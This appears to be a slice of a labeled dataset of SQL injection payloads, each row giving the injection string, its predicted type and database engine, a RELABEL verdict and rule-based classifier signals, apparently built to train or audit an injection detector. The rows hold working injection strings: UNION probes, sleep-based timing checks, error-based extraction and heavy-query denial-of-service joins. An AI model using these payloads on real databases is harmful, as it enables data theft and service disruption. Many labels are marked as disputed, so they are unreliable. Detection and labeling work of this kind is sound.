id,payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,payload_inner,wrapper_detected,strip_depth,a_type,a_db,a_signals,c_type,c_db,c_signals
21396,"1"" ) ) ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,0.9,dbms_pipe,RELABEL,reasoning too short (9 chars),time_blind,oracle,"1"" ) ) ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",False,0,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected
21397,1 ) where 5418 = 5418 union all select null--,union_based,generic,0.7,union_null,RELABEL,reasoning too short (10 chars),union_based,generic,1 ) where 5418 = 5418 union all select null--,False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
21398,1' ) ) ) and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( ( 'eocx' = 'eocx,out_of_band,oracle,0.9,utl_inaddr,RELABEL,reasoning too short (10 chars); rule-check disagrees: rule says 'error_based' (P4) but labeled 'out_of_band' (P6),error_based,oracle,1' ) ) ) and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( ( 'eocx' = 'eocx,False,0,error_based,oracle,Pattern match: 'utl_inaddr.get_host_address' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'utl_inaddr' detected
21399,"1"" where 4294 = 4294 and make_set ( 2543 = 7988,7988 ) --",boolean_blind,mysql,0.7,make_set,RELABEL,reasoning too short (8 chars),boolean_blind,mysql,"1"" where 4294 = 4294 and make_set ( 2543 = 7988,7988 ) --",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
21400,1' ) ) and 4595 = 4595#,boolean_blind,generic,0.5,where_equality,RELABEL,reasoning too short (14 chars); confidence too low (0.50),boolean_blind,generic,1' ) ) and 4595 = 4595#,False,0,boolean_blind,generic,Pattern match: 'and 4595 = 4595' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)"
21401,-6680' ) or 5483 = 3031 and ( 'zxes' = 'zxes,boolean_blind,generic,0.5,or_equality,RELABEL,reasoning too short (11 chars); confidence too low (0.50),boolean_blind,generic,-6680' ) or 5483 = 3031 and ( 'zxes' = 'zxes,False,0,boolean_blind,generic,Pattern match: 'or 5483 = 3031' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)"
21402,"1', ( select ( case when ( 2073 = 5314 ) then 1 else 1/ ( select 0 ) end ) )",boolean_blind,oracle,0.7,case_cast,RELABEL,reasoning too short (9 chars),boolean_blind,oracle,"1', ( select ( case when ( 2073 = 5314 ) then 1 else 1/ ( select 0 ) end ) )",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
21403,"1' and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,0.7,like_randomblob,RELABEL,reasoning too short (15 chars),time_blind,sqlite,"1' and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",False,0,time_blind,sqlite,Pattern match: 'randomblob (' → time_blind (P5); DB signature: sqlite,heavy_query,sqlite,contains 7+ digit number (DoS-style payload)
21404,"1"" ) ) or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ( ""sjiz"" like ""sjiz",heavy_query,firebird,0.7,firebird_sysjoin,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,firebird,"1"" ) ) or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ( ""sjiz"" like ""sjiz",False,0,boolean_blind,firebird,generic SQL keywords without specific signal,boolean_blind,firebird,generic SQL structure without strong signal
21405,1' ) ) ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( 'pneh' like 'pneh,out_of_band,oracle,0.9,dbms_utility,RELABEL,reasoning too short (12 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'out_of_band' (P6),boolean_blind,oracle,1' ) ) ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( 'pneh' like 'pneh,False,0,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal
21406,"1 ) where 4768 = 4768 union all select null,null,null,null,null,null,null,null#",union_based,generic,0.7,union_null,RELABEL,reasoning too short (10 chars),union_based,generic,"1 ) where 4768 = 4768 union all select null,null,null,null,null,null,null,null#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
21407,1' ) where 5286 = 5286,boolean_blind,generic,0.5,where_equality,RELABEL,reasoning too short (14 chars); confidence too low (0.50),boolean_blind,generic,1' ) where 5286 = 5286,False,0,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal
21408,1' ) ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( ( 'ytxg' = 'ytxg,time_blind,mysql,0.7,sleep_subquery,RELABEL,reasoning too short (14 chars),time_blind,mysql,1' ) ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( ( 'ytxg' = 'ytxg,False,0,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal
21409,"1%"" ) ) ) and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",heavy_query,firebird,0.7,firebird_sysjoin,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,firebird,"1%"" ) ) ) and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",False,0,boolean_blind,firebird,generic SQL keywords without specific signal,boolean_blind,firebird,generic SQL structure without strong signal
21410,"1%' ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( '%' = '",time_blind,oracle,0.9,dbms_pipe,RELABEL,reasoning too short (9 chars),time_blind,oracle,"1%' ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( '%' = '",False,0,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected
21411,"1%"" and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ""%"" = """,time_blind,postgresql,0.7,regexp_substring,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,generic,"1%"" and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ""%"" = """,False,0,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload)
21412,1'+ ( select hvsb where 3666 = 3666,boolean_blind,generic,0.5,concat_equality,RELABEL,reasoning too short (15 chars); confidence too low (0.50),boolean_blind,generic,1'+ ( select hvsb where 3666 = 3666,False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
21413,if ( 2697 = 2008 ) select 2697 else drop function jcoo--,stacked_queries,generic,0.7,if_drop,RELABEL,reasoning too short (7 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'stacked_queries' (P8),boolean_blind,generic,if ( 2697 = 2008 ) select 2697 else drop function jcoo--,False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
21414,"1 where 6119 = 6119 or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",heavy_query,firebird,0.7,firebird_sysjoin,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,firebird,"1 where 6119 = 6119 or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",False,0,boolean_blind,firebird,generic SQL keywords without specific signal,boolean_blind,firebird,generic SQL structure without strong signal
21415,-8710 or 9323 = 9323#,boolean_blind,generic,0.5,or_equality,RELABEL,reasoning too short (11 chars); confidence too low (0.50),boolean_blind,generic,-8710 or 9323 = 9323#,False,0,boolean_blind,generic,Pattern match: 'or 9323 = 9323' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)"
21416,1' and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and 'zoin' = 'zoin,time_blind,postgresql,0.9,pg_sleep,RELABEL,reasoning too short (8 chars),time_blind,postgresql,1' and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and 'zoin' = 'zoin,False,0,time_blind,postgresql,Pattern match: 'pg_sleep (' → time_blind (P5); DB signature: postgresql,boolean_blind,postgresql,generic SQL structure without strong signal
21417,"-7996"" ) ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ""iuzv"" like ""iuzv",out_of_band,oracle,0.9,dbms_utility,RELABEL,reasoning too short (12 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'out_of_band' (P6),boolean_blind,oracle,"-7996"" ) ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ""iuzv"" like ""iuzv",False,0,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal
21418,"1"" ) ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( ( ""knbx"" = ""knbx",time_blind,mysql,0.7,sleep_subquery,RELABEL,reasoning too short (14 chars),time_blind,mysql,"1"" ) ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( ( ""knbx"" = ""knbx",False,0,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal
21419,"1' ) ) as fjbe where 4662 = 4662 or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",heavy_query,firebird,0.7,firebird_sysjoin,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,firebird,"1' ) ) as fjbe where 4662 = 4662 or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",False,0,boolean_blind,firebird,generic SQL keywords without specific signal,boolean_blind,firebird,generic SQL structure without strong signal
21420,"-5732' ) union all select 7614,7614,7614,7614--",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,"-5732' ) union all select 7614,7614,7614,7614--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
21421,"1"" union all select null,null,null,null,null--",union_based,generic,0.7,union_null,RELABEL,reasoning too short (10 chars),union_based,generic,"1"" union all select null,null,null,null,null--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
21422,-4157' ) or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( 'rdhm' = 'rdhm,out_of_band,oracle,0.9,utl_inaddr,RELABEL,reasoning too short (10 chars); rule-check disagrees: rule says 'error_based' (P4) but labeled 'out_of_band' (P6),error_based,oracle,-4157' ) or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( 'rdhm' = 'rdhm,False,0,error_based,oracle,Pattern match: 'utl_inaddr.get_host_address' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'utl_inaddr' detected
21423,"-7412"" ) as qngt where 2041 = 2041 union all select 2041--",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,"-7412"" ) as qngt where 2041 = 2041 union all select 2041--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
21424,"-8673"" ) or make_set ( 9354 = 9354,7185 ) and ( ""edap"" like ""edap",boolean_blind,mysql,0.7,make_set,RELABEL,reasoning too short (8 chars),boolean_blind,mysql,"-8673"" ) or make_set ( 9354 = 9354,7185 ) and ( ""edap"" like ""edap",False,0,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check
21425,"1"" order by 1--",boolean_blind,generic,0.5,order_by,RELABEL,reasoning too short (8 chars); confidence too low (0.50),boolean_blind,generic,"1"" order by 1--",False,0,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check
21426,"-4721' ) or elt ( 4378 = 5165,5165 ) and ( 'fufn' = 'fufn",boolean_blind,generic,0.5,elt_equality,RELABEL,reasoning too short (12 chars); confidence too low (0.50),boolean_blind,generic,"-4721' ) or elt ( 4378 = 5165,5165 ) and ( 'fufn' = 'fufn",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,benign,generic,no SQLi signal in heuristic check
21427,"1 ) ) and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( 2748 = 2748",error_based,mysql,0.9,exp_extract,RELABEL,reasoning too short (11 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,"1 ) ) and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( 2748 = 2748",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
21428,"1"" ) where 9648 = 9648 and elt ( 1210 = 1210,sleep ( 5 ) ) --",time_blind,mysql,0.7,elt_sleep,RELABEL,reasoning too short (9 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,mysql,"1"" ) where 9648 = 9648 and elt ( 1210 = 1210,sleep ( 5 ) ) --",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal
21429,"1"" ) ) ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ( ( ( ""fpwu"" like ""fpwu",time_blind,postgresql,0.7,regexp_substring,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,generic,"1"" ) ) ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ( ( ( ""fpwu"" like ""fpwu",False,0,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload)
21430,"-5294%"" ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ""%"" = """,out_of_band,oracle,0.9,xmltype_error,RELABEL,reasoning too short (13 chars); rule-check disagrees: rule says 'error_based' (P4) but labeled 'out_of_band' (P6),error_based,oracle,"-5294%"" ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ""%"" = """,False,0,error_based,oracle,Pattern match: 'xmltype (' → error_based (P4); DB signature: oracle,boolean_blind,oracle,generic SQL structure without strong signal
21431,"1 ) where 2741 = 2741 and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",heavy_query,firebird,0.7,firebird_sysjoin,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,firebird,"1 ) where 2741 = 2741 and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",False,0,boolean_blind,firebird,generic SQL keywords without specific signal,boolean_blind,firebird,generic SQL structure without strong signal
21432,"1, ( select * from generate_series ( 9108,9108,case when ( 9108 = 2900 ) then 1 else 0 end ) limit 1 )",boolean_blind,postgresql,0.7,generate_series,RELABEL,reasoning too short (15 chars),boolean_blind,postgresql,"1, ( select * from generate_series ( 9108,9108,case when ( 9108 = 2900 ) then 1 else 0 end ) limit 1 )",False,0,boolean_blind,postgresql,generic SQL keywords without specific signal,boolean_blind,postgresql,generic SQL structure without strong signal
21433,"-3620'|| ( select 'kmei' where 8533 = 8533 union all select 8533,8533,8533,8533--",union_based,oracle,0.7,oracle_union,RELABEL,reasoning too short (12 chars),union_based,oracle,"-3620'|| ( select 'kmei' where 8533 = 8533 union all select 8533,8533,8533,8533--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
21434,"1' or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and 'ibdj' = 'ibdj",error_based,mysql,0.9,exp_extract,RELABEL,reasoning too short (11 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,"1' or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and 'ibdj' = 'ibdj",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
21435,-9327' ) or 3038 = 3038,boolean_blind,generic,0.5,or_equality,RELABEL,reasoning too short (11 chars); confidence too low (0.50),boolean_blind,generic,-9327' ) or 3038 = 3038,False,0,boolean_blind,generic,Pattern match: 'or 3038 = 3038' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)"
21436,"-9829' ) ) ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",boolean_blind,mysql,0.7,group_concat,RELABEL,reasoning too short (12 chars),boolean_blind,mysql,"-9829' ) ) ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",False,0,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload)
21437,begin user_lock.sleep ( 5 ),time_blind,oracle,0.9,user_lock,RELABEL,reasoning too short (9 chars),time_blind,oracle,begin user_lock.sleep ( 5 ),False,0,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,benign,generic,no SQLi signal in heuristic check
21438,"1"" ) ) or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",heavy_query,mssql,0.7,mssql_sysjoin,RELABEL,reasoning too short (13 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,"1"" ) ) or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
21439,"1' ) ) ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( ( 'toft' = 'toft",error_based,mysql,0.9,exp_extract,RELABEL,reasoning too short (11 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,"1' ) ) ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( ( 'toft' = 'toft",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
21440,"1' where 1602 = 1602 or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --",boolean_blind,mysql,0.7,if_subquery,RELABEL,reasoning too short (11 chars),boolean_blind,mysql,"1' where 1602 = 1602 or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
21441,1 ) where 9167 = 9167,boolean_blind,generic,0.5,where_equality,RELABEL,reasoning too short (14 chars); confidence too low (0.50),boolean_blind,generic,1 ) where 9167 = 9167,False,0,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal
21442,"1"" ) as dien where 4022 = 4022",boolean_blind,generic,0.5,where_equality,RELABEL,reasoning too short (14 chars); confidence too low (0.50),boolean_blind,generic,"1"" ) as dien where 4022 = 4022",False,0,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal
21443,1 ) ) and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --,time_blind,postgresql,0.9,pg_sleep,RELABEL,reasoning too short (8 chars),time_blind,postgresql,1 ) ) and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --,False,0,time_blind,postgresql,Pattern match: 'pg_sleep (' → time_blind (P5); DB signature: postgresql,boolean_blind,postgresql,generic SQL structure without strong signal
21444,"-1083%"" ) ) ) or elt ( 1032 = 1032,3623 ) and ( ( ( ""%"" = """,boolean_blind,generic,0.5,elt_equality,RELABEL,reasoning too short (12 chars); confidence too low (0.50),boolean_blind,generic,"-1083%"" ) ) ) or elt ( 1032 = 1032,3623 ) and ( ( ( ""%"" = """,False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,benign,generic,no SQLi signal in heuristic check
21445,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ""dwbh"" like ""dwbh",time_blind,postgresql,0.7,regexp_substring,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,generic,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ""dwbh"" like ""dwbh",False,0,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload)
21446,"-9197%"" ) ) ) union all select 1040,1040,1040,1040,1040,1040,1040,1040,1040#",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,"-9197%"" ) ) ) union all select 1040,1040,1040,1040,1040,1040,1040,1040,1040#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
